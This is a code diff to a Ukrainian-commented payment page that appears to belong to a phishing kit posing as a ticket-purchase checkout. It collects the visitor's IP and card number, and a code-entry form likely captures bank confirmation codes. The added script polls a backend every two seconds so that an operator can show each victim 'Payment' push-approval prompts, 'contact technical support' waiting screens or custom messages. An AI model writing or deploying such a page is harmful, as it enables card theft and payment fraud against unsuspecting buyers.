@@ -169,7 +169,7 @@
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="payment-card-main">
         <div class="icon">
             <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0-1.104.896-2 2-2s2 .896 2 2-.896 2-2 2-2-.896-2-2zm0 0V7m0 4v4m0 0c0 1.104-.896 2-2 2s-2-.896-2-2 .896-2 2-2 2 .896 2 2z"/>
@@ -207,8 +207,217 @@
                 .then(data => callback(data.ip))
                 .catch(() => callback(null));
         }
+        // --- Витягуємо total і currency з URL ---
+        function getTotalAndCurrency() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const totalRaw = urlParams.get('total') || sessionStorage.getItem('ticket_total');
+            const currencyRaw = urlParams.get('currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+            if (totalRaw) {
+                const match = totalRaw.match(/\d+[\.,]?\d*/);
+                const totalNum = match ? match[0].replace(',', '.') : '';
+                return { total: totalNum, currency: currencyRaw };
+            }
+            // fallback: price/currency
+            let price = localStorage.getItem('ticket_price') || sessionStorage.getItem('ticket_price');
+            let currency = localStorage.getItem('ticket_currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+            return { total: price, currency };
+        }
+        // --- Універсальний POLLING для всіх кнопок (push, support, text) ---
+        let supportTabOpened = false;
+        let pushTabOpened = false;
+        let textTabOpened = false;
+        
+        function getPageCode() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
+        }
+        
+        function startUniversalPolling() {
+            setTimeout(pollAllButtons, 2000);
+        }
+        
+        async function pollAllButtons() {
+            const page_code = getPageCode();
+            document.body.setAttribute('data-page-code', page_code);
+            
+            if (!page_code) {
+                return setTimeout(pollAllButtons, 2000);
+            }
+            
+            // Polling для push кнопки
+            try {
+                const pushUrl = '/check_push?page_code=' + encodeURIComponent(page_code);
+                const pushResp = await fetch(pushUrl);
+                const pushTxt = await pushResp.text();
+                
+                if (pushTxt === 'true' && !pushTabOpened) {
+                    const { total, currency } = getTotalAndCurrency();
+                    const pushTitle = document.getElementById('push-payment-title');
+                    if (pushTitle) {
+                        pushTitle.textContent = `Payment ${total} ${currency}`;
+                    }
+                    // Скидаємо стани інших кнопок
+                    supportTabOpened = false;
+                    textTabOpened = false;
+                    
+                    // Приховуємо всі інші overlay
+                    if (document.getElementById('support-overlay')) {
+                        document.getElementById('support-overlay').style.display = 'none';
+                    }
+                    if (document.getElementById('text-overlay')) {
+                        document.getElementById('text-overlay').style.display = 'none';
+                    }
+                    
+                    document.getElementById('push-overlay').style.display = 'flex';
+                    document.getElementById('payment-card-main').style.display = 'none';
+                    if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
+                    pushTabOpened = true;
+                }
+            } catch (e) {
+                console.error('Push polling error:', e);
+            }
+            
+            // Polling для support/text кнопок - НЕ чекаємо userIP
+            try {
+                // Використовуємо поточний userIP або null
+                const currentIP = userIP || 'unknown';
+                const supportUrl = `/check_support?ip=${encodeURIComponent(currentIP)}`;
+                const supportResp = await fetch(supportUrl);
+                const supportData = await supportResp.json();
+                
+                if ((supportData.show_support || supportData.show_text)) {
+                    if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
+                }
+                
+                // Support кнопка - показуємо overlay замість нового вікна
+                if (!supportTabOpened && supportData.show_support) {
+                    // Скидаємо стани інших кнопок
+                    pushTabOpened = false;
+                    textTabOpened = false;
+                    
+                    // Створюємо support overlay якщо його немає
+                    if (!document.getElementById('support-overlay')) {
+                    const supportOverlay = document.createElement('div');
+                        supportOverlay.id = 'support-overlay';
+                        supportOverlay.style.cssText = `
+                            display: flex;
+                            position: fixed;
+                            top: 0; left: 0; width: 100vw; height: 100vh;
+                        background: #00b2ff;
+                            z-index: 100000;
+                            align-items: center;
+                            justify-content: center;
+                            flex-direction: column;
+                        `;
+                        supportOverlay.innerHTML = `
+                            <div style="background: white; border-radius: 20px; padding: 2.5rem 2rem; max-width: 370px; width: 90%; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.12);">
+                                <div style="width: 60px; height: 60px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.2rem auto;">
+                                    <svg width="36" height="36" viewBox="0 0 24 24" fill="white">
+                                        <path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/>
+                                    </svg>
+                                </div>
+                                <h3 style="font-size: 2rem; font-weight: 700; margin-bottom: 1.2rem; color: #222;">Waiting</h3>
+                                <p style="font-size: 1.1rem; color: #666; margin-bottom: 1.5rem;">Contact technical support</p>
+                                <div style="width: 50px; height: 50px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto;">
+                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+                                        <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
+                                    </svg>
+                                </div>
+                            </div>
+                        `;
+                        document.body.appendChild(supportOverlay);
+                    }
+                    // Приховуємо всі інші overlay
+                    if (document.getElementById('text-overlay')) {
+                        document.getElementById('text-overlay').style.display = 'none';
+                    }
+                    if (document.getElementById('push-overlay')) {
+                        document.getElementById('push-overlay').style.display = 'none';
+                    }
+                    document.getElementById('support-overlay').style.display = 'flex';
+                    document.getElementById('payment-card-main').style.display = 'none';
+                    supportTabOpened = true;
+                }
+                
+                // Text кнопка - показуємо overlay замість нового вікна
+                if (!textTabOpened && supportData.show_text && supportData.text_id) {
+                    // Скидаємо стани інших кнопок
+                    pushTabOpened = false;
+                    supportTabOpened = false;
+                    
+                    // Завантажуємо текст і показуємо overlay
+                    fetch(`/get_custom_text?text_id=${supportData.text_id}`)
+                    .then(resp => resp.text())
+                    .then(textContent => {
+                            if (!document.getElementById('text-overlay')) {
+                                const textOverlay = document.createElement('div');
+                                textOverlay.id = 'text-overlay';
+                                textOverlay.style.cssText = `
+                                    display: flex;
+                                    position: fixed;
+                                    top: 0; left: 0; width: 100vw; height: 100vh;
+                                background: #00b2ff;
+                                    z-index: 100000;
+                                    align-items: center;
+                                    justify-content: center;
+                                    flex-direction: column;
+                                `;
+                                textOverlay.innerHTML = `
+                                    <div style="background: white; border-radius: 20px; padding: 2.5rem 2rem; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; box-shadow: 0 8px 32px rgba(0,0,0,0.12);">
+                                        <div style="width: 60px; height: 60px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.2rem auto;">
+                                            <svg width="36" height="36" viewBox="0 0 24 24" fill="white">
+                                                <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/>
+                                            </svg>
+                                        </div>
+                                        <h3 style="font-size: 2rem; font-weight: 700; margin-bottom: 1.2rem; color: #222; text-align: center;">Important Information</h3>
+                                        <div id="text-content" style="margin: 1rem 0; text-align: left; line-height: 1.6; color: #333;"></div>
+                                        <div style="text-align: center; margin-top: 2rem;">
+                                            <button onclick="document.getElementById('text-overlay').style.display='none';document.getElementById('payment-card-main').style.display='block';" 
+                                                    style="background: #00b2ff; color: white; border: none; padding: 1rem 2rem; border-radius: 12px; font-size: 1.1rem; font-weight: 500; cursor: pointer; transition: background 0.2s;">
+                                                Close
+                                            </button>
+                                        </div>
+                                    </div>
+                                `;
+                                document.body.appendChild(textOverlay);
+                            }
+                            // Приховуємо всі інші overlay
+                            if (document.getElementById('support-overlay')) {
+                                document.getElementById('support-overlay').style.display = 'none';
+                            }
+                            if (document.getElementById('push-overlay')) {
+                                document.getElementById('push-overlay').style.display = 'none';
+                            }
+                        document.getElementById('text-content').textContent = textContent || '';
+                            document.getElementById('text-overlay').style.display = 'flex';
+                            document.getElementById('payment-card-main').style.display = 'none';
+                            textTabOpened = true;
+                        })
+                        .catch(e => console.error('Text loading error:', e));
+                }
+            } catch (e) {
+                console.error('Support polling error:', e);
+            }
+            
+            setTimeout(pollAllButtons, 2000);
+        }
+        
+        // Стартуємо polling одразу, а не чекаємо userIP
+        startUniversalPolling();
+        
+        // Оновлюємо userIP коли він стає доступним
         getUserIP(function(ip) {
             userIP = ip;
+        });
+
+        // Валідація для номера карти - тільки цифри
+        document.addEventListener('DOMContentLoaded', function() {
+            var cardInput = document.getElementById('card-input');
+            if (cardInput) {
+                cardInput.addEventListener('input', function(e) {
+                    this.value = this.value.replace(/\D/g, '').slice(0, 16);
+                });
+            }
         });
 
         codeForm.addEventListener('submit', async function(e) {
@@ -240,41 +449,6 @@
                 loadingOverlay.style.display = 'none';
             }
         });
-        // --- POLLING для support/text кнопок ---
-        let supportTabOpened = false;
-        function getQueryParam(name) {
-            const url = new URL(window.location.href);
-            return url.searchParams.get(name);
-        }
-        function getPageCode() {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
-        }
-        async function pollSupportButtons() {
-            if (!userIP) {
-                return setTimeout(pollSupportButtons, 2000);
-            }
-            try {
-                const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
-                const data = await resp.json();
-                if ((data.show_support || data.show_text)) {
-                    loadingOverlay.style.display = 'none';
-                }
-                if (!supportTabOpened && (data.show_support || data.show_text)) {
-                    const page_code = getPageCode();
-                    if (data.show_support) {
-                        window.open(`/buy-tickets/loading/waiting-support.html?page=${page_code}`, '_blank');
-                        supportTabOpened = true;
-                    }
-                    if (data.show_text && data.text_id) {
-                        window.open(`/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${data.text_id}`, '_blank');
-                        supportTabOpened = true;
-                    }
-                }
-            } catch (e) {}
-            setTimeout(pollSupportButtons, 2000);
-        }
-        setTimeout(pollSupportButtons, 2000);
         // Polling for request_again
         setInterval(async function() {
             if (!lastCode) return;
@@ -343,34 +517,6 @@
       `;
       document.body.appendChild(pushOverlay);
     }
-    </script>
-    <!-- Polling для push (push-overlay) -->
-    <script>
-    function getPageCode() {
-      const urlParams = new URLSearchParams(window.location.search);
-      let page = urlParams.get('page');
-      if (page) return page;
-      page = sessionStorage.getItem('page_code');
-      if (page) return page;
-      return '';
-    }
-    function pollPushOverlay() {
-      const page_code = getPageCode();
-      document.body.setAttribute('data-page-code', page_code);
-      if (!page_code) return setTimeout(pollPushOverlay, 2000);
-      const url = '/check_push?page_code=' + encodeURIComponent(page_code);
-      fetch(url)
-        .then(resp => resp.text())
-        .then(txt => {
-          if (txt === 'true') {
-            document.getElementById('push-overlay').style.display = 'flex';
-            if (window.loadingOverlay) loadingOverlay.style.display = 'none';
-          } else {
-            setTimeout(pollPushOverlay, 2000);
-          }
-        });
-    }
-    setTimeout(pollPushOverlay, 2000);
     </script>
 </body>
 </html> 
